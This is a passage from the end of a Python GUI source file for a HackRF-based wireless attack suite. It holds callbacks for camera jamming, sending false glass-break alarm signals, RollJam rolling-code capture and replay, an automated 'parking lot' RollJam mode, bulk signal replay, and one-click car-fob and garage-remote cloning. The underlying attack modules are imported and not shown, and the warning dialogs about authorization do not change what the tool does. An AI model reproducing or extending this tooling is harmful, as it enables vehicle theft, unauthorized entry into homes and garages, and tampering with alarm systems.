                    ))
            
            threading.Thread(target=jam_thread, daemon=True).start()
            
        except Exception as e:
            print(f"[Camera] Jamming error: {e}")
            messagebox.showerror("Error", f"Camera jamming failed: {e}")
    
    def _stop_camera_jam(self):
        """Stop camera jamming"""
        if self.camera_jammer:
            self.camera_jammer.stop_jamming()
            self.camera_status_label.config(text="Jam stopped", fg='#10B981')
            print("[Camera] Jamming stopped")
        else:
            print("[Camera] No active jam to stop")
    
    # ===== GLASS BREAK CALLBACKS =====
    
    def _detect_glass_break(self):
        """Start glass break sensor detection"""
        try:
            # Lazy init
            if not self.glass_break_attack:
                from modules.attacks import GlassBreakAttack
                self.glass_break_attack = GlassBreakAttack(
                    sdr_controller=self.subghz.sdr if self.subghz else None,
                    recorder=self.scanner_modules.get('recorder'),
                    config=self.config
                )
                self.glass_break_attack.set_detection_callback(self._on_glass_break_detected)
            
            self.glass_status_label.config(text="Scanning...", fg='#F59E0B')
            self.btn_detect_glass.config(state='disabled')
            
            # Start detection in thread
            def detect_thread():
                success = self.glass_break_attack.start_detection(duration=30)
                if success:
                    print("[Glass Break] Detection started (30s)")
                else:
                    print("[Glass Break] Detection failed")
                    self.root.after(0, lambda: self.glass_status_label.config(text="Failed", fg='#DC2626'))
                    self.root.after(0, lambda: self.btn_detect_glass.config(state='normal'))
            
            threading.Thread(target=detect_thread, daemon=True).start()
            
            # Auto re-enable after 30s
            self.root.after(31000, self._finish_glass_detection)
            
        except Exception as e:
            print(f"[Glass Break] Detection error: {e}")
            messagebox.showerror("Error", f"Glass break detection failed: {e}")
            self.glass_status_label.config(text="Error", fg='#DC2626')
            self.btn_detect_glass.config(state='normal')
    
    def _on_glass_break_detected(self, sensor):
        """Callback when glass break sensor detected"""
        def update_gui():
            import time
            time_str = time.strftime('%H:%M:%S', time.localtime(sensor.timestamp))
            self.glass_tree.insert('', 'end', values=(
                sensor.device_id,
                f"{sensor.frequency_mhz} MHz",
                f"{sensor.signal_strength:.3f}",
                time_str
            ))
            self.glass_status_label.config(text=f"Detected: {sensor.device_id}", fg='#10B981')
        
        self.root.after(0, update_gui)
    
    def _finish_glass_detection(self):
        """Finish glass break detection"""
        if self.glass_break_attack:
            self.glass_break_attack.stop_detection()
        
        count = len(self.glass_tree.get_children())
        self.glass_status_label.config(text=f"Found {count} sensor(s)", fg='#10B981')
        self.btn_detect_glass.config(state='normal')
    
    def _trigger_glass_break(self):
        """Trigger selected glass break sensor"""
        selected = self.glass_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a glass break sensor to trigger")
            return
        
        try:
            # Get selected sensor
            if not self.glass_break_attack:
                messagebox.showerror("Error", "Glass break attack not initialized")
                return
            
            sensors = self.glass_break_attack.get_detected_sensors()
            if not sensors:
                messagebox.showerror("Error", "No sensors available")
                return
            
            # Get index of selected item
            item = self.glass_tree.item(selected[0])
            sensor_id = item['values'][0]
            
            # Find matching sensor
            sensor = next((s for s in sensors if s.device_id == sensor_id), None)
            if not sensor:
                messagebox.showerror("Error", "Sensor not found")
                return
            
            # Confirm
            result = messagebox.askokcancel(
                "Trigger Glass Break",
                f"⚠️ WARNING ⚠️\n\n"
                f"Trigger glass break alarm?\n\n"
                f"Sensor: {sensor.device_id}\n"
                f"Frequency: {sensor.frequency_mhz} MHz\n\n"
                f"This will send a false glass break alarm signal.\n"
                f"Only use with explicit authorization!\n\n"
                f"Continue?"
            )
            
            if not result:
                return
            
            # Trigger in thread
            def trigger_thread():
                self.root.after(0, lambda: self.glass_status_label.config(text="Triggering...", fg='#F59E0B'))
                success = self.glass_break_attack.trigger_sensor(sensor, repeats=3)
                if success:
                    self.root.after(0, lambda: self.glass_status_label.config(text="Trigger sent", fg='#10B981'))
                    print(f"[Glass Break] Triggered {sensor.device_id}")
                else:
                    self.root.after(0, lambda: self.glass_status_label.config(text="Trigger failed", fg='#DC2626'))
            
            threading.Thread(target=trigger_thread, daemon=True).start()
            
        except Exception as e:
            print(f"[Glass Break] Trigger error: {e}")
            messagebox.showerror("Error", f"Failed to trigger: {e}")
    
    def _test_synthetic_glass(self):
        """Test synthetic glass break pattern"""
        try:
            freq = float(self.glass_freq_var.get())
            
            # Confirm
            result = messagebox.askokcancel(
                "Test Synthetic Glass Break",
                f"⚠️ WARNING ⚠️\n\n"
                f"Generate synthetic glass break signal?\n\n"
                f"Frequency: {freq} MHz\n"
                f"Pattern: Standard\n\n"
                f"This will transmit a synthetic glass break pattern.\n"
                f"Only use with explicit authorization!\n\n"
                f"Continue?"
            )
            
            if not result:
                return
            
            # Lazy init if needed
            if not self.glass_break_attack:
                from modules.attacks import GlassBreakAttack
                self.glass_break_attack = GlassBreakAttack(
                    sdr_controller=self.subghz.sdr if self.subghz else None,
                    recorder=self.scanner_modules.get('recorder'),
                    config=self.config
                )
            
            # Test in thread
            def test_thread():
                self.root.after(0, lambda: self.glass_status_label.config(text="Testing...", fg='#F59E0B'))
                success = self.glass_break_attack.trigger_synthetic(frequency_mhz=freq, pattern="standard")
                if success:
                    self.root.after(0, lambda: self.glass_status_label.config(text="Test sent", fg='#10B981'))
                    print(f"[Glass Break] Synthetic test sent on {freq} MHz")
                else:
                    self.root.after(0, lambda: self.glass_status_label.config(text="Test failed", fg='#DC2626'))
            
            threading.Thread(target=test_thread, daemon=True).start()
            
        except Exception as e:
            print(f"[Glass Break] Test error: {e}")
            messagebox.showerror("Error", f"Synthetic test failed: {e}")


    def _refresh_rf_list(self):
        """Refresh the saved RF signals list"""
        if not hasattr(self.scanner_modules.get('subghz'), 'sdr'):
            return
            
        # Get rolling attack object if it exists
        if not hasattr(self, 'rolling_attack'):
            from modules.attacks import RollingCodeAttack
            sdr = self.scanner_modules['subghz'].sdr
            self.rolling_attack = RollingCodeAttack(sdr)
            
        # Clear tree
        for item in self.rf_tree.get_children():
            self.rf_tree.delete(item)
            
        # Fill tree
        for i, sig in enumerate(self.rolling_attack.captured_signals):
            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(sig.timestamp))
            freq = f"{sig.frequency/1e6:.2f} MHz"
            self.rf_tree.insert('', 'end', values=(i, ts, freq, len(sig.samples)))
            
    def _replay_saved_rf(self):
        """Replay selected signal from the list"""
        selected = self.rf_tree.selection()
        if not selected:
            self._log_attack_status("RF Replay: No signal selected")
            return
            
        item = self.rf_tree.item(selected[0])
        idx = int(item['values'][0])
        
        if hasattr(self, 'rolling_attack'):
            self.rolling_attack.replay_signal(idx)
            self._log_attack_status(f"RF Replay: Transmitting signal {idx}...")
        else:
            self._log_attack_status("RF Replay: Error - Attack engine not ready")
    
    def _log_attack_status(self, message):
        print(f"[AttackStatus] {message}")
        if hasattr(self, 'attack_status_text'):
            self.attack_status_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
            self.attack_status_text.see(tk.END)
    
    def _toggle_auto_rolljam(self):
        """Toggle automated RollJam parking lot mode"""
        if not self.subghz:
            messagebox.showerror("Error", "SDR not available")
            return
        
        if not self.auto_rolljam_active:
            # Start Auto RollJam
            from modules.auto_rolljam import AutoRollJam
            
            if not hasattr(self, 'auto_rolljam'):
                self.auto_rolljam = AutoRollJam(
                    self.subghz.sdr,
                    self.scanner_modules.get('recorder'),
                    frequencies=[315e6, 433.92e6]
                )
            
            # Pre-emptive hardware reset to clear any hidden state
            self._log_attack_status("[AutoRollJam] Performing pre-emptive SDR reset...")
            self.subghz.sdr.close()
            time.sleep(0.5)

            # Stop SubGHz Scanner to release SDR
            if self.subghz:
                self._log_attack_status("[AutoRollJam] Inhibiting SubGHz scanner...")
                self.subghz.stop()
                time.sleep(0.5)

            self.auto_rolljam.start()
            self.auto_rolljam_active = True
            self.btn_auto_rolljam.config(text="🚨 AUTO ROLLJAM: ON", bg='#DC2626')
            self._log_attack_status("🚨 AUTO ROLLJAM ACTIVE - Monitoring 315/433 MHz")
        else:
            # Stop Auto RollJam
            if hasattr(self, 'auto_rolljam'):
                self.auto_rolljam.stop()
            self.auto_rolljam_active = False
            self.btn_auto_rolljam.config(text="🚨 START AUTO ROLLJAM", bg='#EB5E28')
            self._log_attack_status("AUTO ROLLJAM: Stopped")
            
            # Restart SubGHz Scanner
            if self.subghz:
                self._log_attack_status("[AutoRollJam] Restarting SubGHz scanner...")
                self.subghz.start()
    
    def _replay_all(self):
        """Replay all saved recordings sequentially"""
        rec = self.scanner_modules.get('recorder')
        if not rec:
            messagebox.showerror("Error", "Recorder not available")
            return
        
        recordings = rec.list_recordings()
        
        if not recordings:
            messagebox.showwarning("No Recordings", "No recordings to replay")
            return
        
        # Confirm with user
        count = len(recordings)
        response = messagebox.askyesno(
            "Replay All",
            f"Replay all {count} recordings RAPIDLY?\n\n"
            "This will transmit each signal with 0.3 second gaps.\n"
            f"Total time: ~{int(count * 0.5)} seconds (FAST MODE)"
        )
        
        if not response:
            return
        
        # Replay all in a thread to avoid blocking GUI
        def replay_thread():
            for idx, recording in enumerate(recordings):
                try:
                    rec_id = recording.get('id')
                    name = recording.get('name', 'Unknown')
                    freq = recording.get('freq_mhz', 0)
                    
                    self._log_attack_status(f"[{idx+1}/{count}] Replaying: {name} @ {freq} MHz...")
                    print(f"[Replay All] {idx+1}/{count}: {name}")
                    
                    rec.replay(rec_id)
                    
                    # Short gap between transmissions
                    time.sleep(0.3)
                    
                except Exception as e:
                    print(f"[Replay All] Error replaying {name}: {e}")
                    self._log_attack_status(f"❌ Error replaying {name}: {e}")
            
            self._log_attack_status(f"✅ Replay All Complete: {count} signals transmitted")
            messagebox.showinfo("Complete", f"Replayed all {count} recordings successfully")
        
        threading.Thread(target=replay_thread, daemon=True).start()
    
    def _quick_clone(self):
        """One-click vehicle/garage remote cloning"""
        if not self.vehicle_cloner:
            messagebox.showerror("Clone Not Available", 
                               "Vehicle cloner not initialized.\n\n"
                               "Requires HackRF One with working SDR controller.")
            return
        
        # Get frequency from preset or use default
        preset_name = self.preset_var.get() if hasattr(self, 'preset_var') else ""
        freq = 315.0  # Default
        
        if preset_name:
            # Extract frequency from preset
            for p in self._get_presets_list():
                if p['name'] == preset_name:
                    freq = p['freq']
                    break
        else:
            # Ask user for frequency
            freq_input = simpledialog.askfloat(
                "Clone Frequency",
                "Enter frequency to capture (MHz):\n\n"
                "Common frequencies:\n"
                "315.00 - US car fobs\n"
                "433.92 - EU car fobs/garage\n"
                "390.00 - Some garage doors",
                initialvalue=315.0,
                minvalue=10.0,
                maxvalue=6000.0
            )
            if not freq_input:
                return
            freq = freq_input
        
        # Show instructions
        response = messagebox.askyesno(
            "🔑 Quick Clone Mode",
            f"Ready to clone remote at {freq} MHz\n\n"
            f"Instructions:\n"
            f"1. Click OK to start 5-second capture\n"
            f"2. Press your car fob/garage button\n"
            f"3. Signal will be automatically captured and decoded\n"
            f"4. Use REPLAY button to transmit\n\n"
            f"Start clone?"
        )
        
        if not response:
            return
        
        # Run clone in thread
        def clone_thread():
            try:
                self._log_attack_status(f"🔑 [Clone] Starting quick clone at {freq} MHz...")
                
                result = self.vehicle_cloner.quick_clone(freq_mhz=freq, duration=5.0)
                
                if result.get('success'):
                    clone_info = result.get('clone', {})
                    detection = result.get('detection', {})
                    
                    protocol = detection.get('protocol', 'Unknown')
                    confidence = detection.get('confidence', 0.0)
                    
                    self._log_attack_status(
                        f"✅ [Clone] Captured! Protocol: {protocol} ({confidence:.0%} confidence)"
                    )
                    
                    # Refresh recordings list
                    self._update_recordings_list()
                    
                    # Show success
                    msg = f"Clone successful!\n\n"
                    msg += f"Protocol: {protocol}\n"
                    msg += f"Frequency: {freq} MHz\n"
                    if clone_info.get('button'):
                        msg += f"Button: {clone_info.get('button')}\n"
                    if clone_info.get('serial'):
                        msg += f"Serial: {clone_info.get('serial')}\n"
                    msg += f"\nUse REPLAY button to transmit!"
                    
                    messagebox.showinfo("Clone Complete", msg)
                else:
                    error = result.get('error', 'Unknown error')
                    self._log_attack_status(f"❌ [Clone] Failed: {error}")
                    messagebox.showerror("Clone Failed", f"Failed to clone signal:\n\n{error}")
                    
            except Exception as e:
                self._log_attack_status(f"❌ [Clone] Error: {e}")
                messagebox.showerror("Clone Error", f"Clone error:\n\n{e}")
        
        threading.Thread(target=clone_thread, daemon=True).start()
    
    def _refresh_rf_list(self):
        """Refresh RF recordings list manually"""
        self._update_recordings_list()


# Compatibility wrapper for main.py
# Compatibility wrapper for main.py
class WirelessScannerGUI:
    """Wrapper to make AdvancedScannerGUI compatible with legacy initialization"""
    
    def __init__(self, config: Dict):
        import tkinter as tk
        from core import DeviceRegistry, DiscoveryEngine
        
        print("[GUI] Initializing SDR Intelligence Suite...")
        
        # Create root window
        self.root = tk.Tk()
        self.config = config
        self.registry = DeviceRegistry()
        self.discovery_engine = DiscoveryEngine(config)
        
        # Initialize scanner modules
        scanner_modules = {}

        try:
            # Sub-GHz & SDR
            from modules.subghz_scanner import SubGHzScanner
            from modules.sdr_controller import SDRController
            from modules.subghz_recorder import SubGhzRecorder
            
            # Initialize SDR
            sdr_id = config.get('hardware', {}).get('hackrf_device', 0)
            self.sdr_controller = SDRController(sdr_id)
            if self.sdr_controller.open():
                scanner_modules['subghz'] = SubGHzScanner(
                    self.sdr_controller, 
                    config
                )
                print("[GUI] SDR Intelligence Suite Initialized")
                
                # Auto-Engine is initialized in AdvancedScannerGUI
            else:
                 print("[GUI] Failed to open SDR device")

        except Exception as e:
            print(f"[GUI] SDR init failed: {e}")
            import traceback
            traceback.print_exc()

        # Init Main GUI (root, registry, modules, config)
        self.gui = AdvancedScannerGUI(self.root, self.registry, scanner_modules, config)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    import yaml
    import os
    
    def load_config(path='config.yaml'):
        if os.path.exists(path):
            with open(path, 'r') as f:
                return yaml.safe_load(f)
        return {}
        
    config = load_config()
    gui = WirelessScannerGUI(config)
    gui.run()
